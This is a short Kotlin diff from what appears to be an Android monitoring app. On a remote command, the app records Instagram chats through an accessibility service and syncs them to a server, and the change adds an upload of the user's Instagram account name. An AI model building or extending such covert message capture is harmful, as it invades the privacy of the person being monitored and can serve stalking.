@@ -104,6 +104,10 @@ class SyncRunner(private val context: Context) {
                 com.spapp.monitoring.blocking.BlockAccessibilityService.instance?.let { service ->
                     service.recordInstagramChatIfForeground(service.rootInActiveWindow)
                 }
+                val currentAcc = state.instagramAccount
+                if (!currentAcc.isNullOrBlank()) {
+                    ApiClient.service.updateInstagramAccount(bearer, mapOf("accountName" to currentAcc))
+                }
                 syncInstagramMessages(bearer, AppDatabase.getInstance(context))
                 ApiClient.service.ackCommand(bearer, command.id, AckCommandRequest(success = true, message = "Instagram sync triggered"))
             } catch (_: Exception) {}
